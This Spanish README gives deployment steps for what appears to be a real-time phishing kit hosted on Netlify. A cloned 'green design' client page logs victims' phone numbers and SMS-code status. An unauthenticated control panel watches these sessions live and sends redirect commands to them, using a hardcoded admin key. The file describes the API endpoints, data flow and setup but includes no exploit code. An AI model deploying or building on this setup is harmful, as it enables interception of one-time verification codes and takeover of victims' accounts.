# 📱 Sistema Monitoreo SMS para Netlify

Sistema de monitoreo global de sesiones de verificación SMS desplegado en Netlify con Functions.

## 🚀 **Características**

- ✅ **Backend serverless** con Netlify Functions
- ✅ **Monitoreo global** - Ver datos desde cualquier dispositivo
- ✅ **Diseño verde original** - Igual que index1,2,3
- ✅ **Tiempo real** - Actualización cada 5 segundos
- ✅ **Sin dependencias** - No requiere npm install
- ✅ **Deploy rápido** - 2-3 minutos máximo
- ✅ **Sin contraseña** - Acceso directo sin autenticación

## 📁 **Estructura del Proyecto**

```
/
├── netlify/
│   └── functions/
│       └── sessions.js          # Backend API
├── index5-green.html            # Cliente SMS
├── panel-control-optimized.html # Panel de control
├── netlify.toml                 # Configuración Netlify
└── README.md                    # Este archivo
```

## 🔧 **Configuración de Netlify**

### Variables de Entorno
En Netlify Dashboard → Site settings → Environment variables:
```
NODE_VERSION=18.x
```

### Build Settings
- **Build command**: `(dejar vacío)`
- **Publish directory**: `.`
- **Functions directory**: `netlify/functions`

## 🔓 **Acceso Libre**

- ✅ **Sin contraseña** - Acceso directo al panel
- ✅ **Sin login** - No requiere autenticación

## 📡 **Endpoints de la API**

### POST /.netlify/functions/sessions
Crear/actualizar sesión SMS:
```json
{
  "sessionId": "unique_id",
  "phoneNumber": "+1234567890",
  "timestamp": "2025-01-05T23:48:49.000Z",
  "status": "sms_sent",
  "codigoEnviado": true
}
```

### GET /.netlify/functions/sessions
Obtener todas las sesiones:
```json
[
  {
    "sessionId": "session_123",
    "phoneNumber": "+1234567890",
    "status": "sms_sent"
  }
]
```

### GET /.netlify/functions/sessions/:id
Obtener sesión específica + comandos de redirección:
```json
{
  "session": { "sessionId": "123", "phoneNumber": "+1234567890" },
  "redirect_to": "https://example.com"
}
```

### POST /.netlify/functions/sessions/redirect
Enviar comando de redirección (requiere auth):
```json
{
  "sessionId": "session_123",
  "page": "https://example.com/success",
  "auth": "admin-4dfc-tramp-2024"
}
```

## 🌐 **URLs del Sistema**

Una vez desplegado:
- **Cliente SMS**: `https://tu-sitio.netlify.app/index5-green.html`
- **Panel Control**: `https://tu-sitio.netlify.app/panel-control-optimized.html`
- **API**: `https://tu-sitio.netlify.app/.netlify/functions/sessions`

## 🛠️ **Desarrollo Local**

### Prerrequisitos
- Node.js 18+
- Netlify CLI

### Instalación
```bash
npm install -g netlify-cli
netlify dev
```

### Deploy a GitHub + Netlify
1. Crear repositorio en GitHub
2. Conectar con Netlify
3. Activar deploys automáticos

## 🔍 **Solución de Problemas**

### Deploy Timeout
- Función optimizada para < 2 segundos
- Sin dependencias externas
- Variables globales mínimas

### Build Failed
- Verificar `netlify.toml` en raíz
- No usar `package.json` (no requiere npm)
- Functions en `netlify/functions/`

### API No Responde
- Verificar `netlify.toml` con `[functions] directory = "netlify/functions"`
- Logs en Netlify Dashboard → Functions → Logs

### CORS Errors
- Headers configurados en la Function
- Dominio en `Access-Control-Allow-Origin: *`

## 📊 **Cómo Funciona**

1. **Cliente** abre `index5-green.html`
2. **Envía SMS** → Se registra en el backend
3. **Panel** lee datos del backend vía API
4. **Actualización automática** cada 5 segundos
5. **Vista global** desde cualquier dispositivo

## 🔄 **Flujo de Datos**

```
Cliente → index5-green.html
   ↓
POST /.netlify/functions/sessions
   ↓
Guardar en memoria (Function)
   ↓
Panel ← GET /.netlify/functions/sessions
   ↓
Mostrar en dashboard
```

## ⚡ **Optimizaciones**

- **Sin database** - Almacenamiento en memoria de la Function
- **CORS configurado** - Headers automáticos
- **Tiempo de respuesta** - < 500ms promedio
- **Tamaño mínimo** - ~5KB total
- **Sin dependencias** - Solo Node.js nativo

## 📞 **Soporte**

### Ver logs de errores:
1. Dashboard Netlify → Tu sitio
2. Deploys → Deploy details
3. Build log o Functions logs

### Logs comunes:
- ✅ "Function completed successfully"
- ❌ "Timeout after 10 seconds"
- ❌ "Module not found"
- ❌ "Build failed"

---
**Creado por**: 4DFC TRAMP$$
**Versión**: GitHub + Netlify v1.0
**Compatibilidad**: Netlify Functions + Static hosting